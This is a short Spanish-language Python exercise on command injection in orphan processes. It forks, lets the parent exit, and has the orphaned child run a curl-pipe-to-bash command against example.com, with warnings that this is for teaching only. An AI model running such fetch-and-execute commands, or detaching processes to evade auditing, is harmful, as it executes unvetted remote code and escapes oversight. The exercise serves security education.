"""Ejercicio 10: Inyección de comandos en procesos huérfanos (Análisis de riesgo)"""
# Simula un escenario donde un proceso huérfano ejecuta un comando externo sin control del padre. 
# Analiza qué implicaciones tendría esto en términos de seguridad o evasión de auditorías.

"""import os, time

pid = os.fork()
if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
    time.sleep(3)"""
    
import os
import time

pid = os.fork()
if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
else:
    print("[HIJO] Ejecutando script como huérfano...")

    # Peligroso: ejecutar comandos no validados
    # Se debería evitar esta práctica, ya que puede llevar a inyecciones de comandos
    print("[HIJO] Peligro de inyección de comandos: NO ejecutar esto en sistemas de producción")
    print("[HIJO] Advertencia: este código es solo para fines educativos.")
    
    # Ejecutar comando externo sin control (riesgoso)
    os.system("curl http://example.com/script.sh | bash")  # Comando peligroso

    # Pausa para observar el proceso
    time.sleep(3)

    print("[HIJO] Comando ejecutado. No se recomienda dejar procesos huérfanos ejecutar comandos no controlados.")
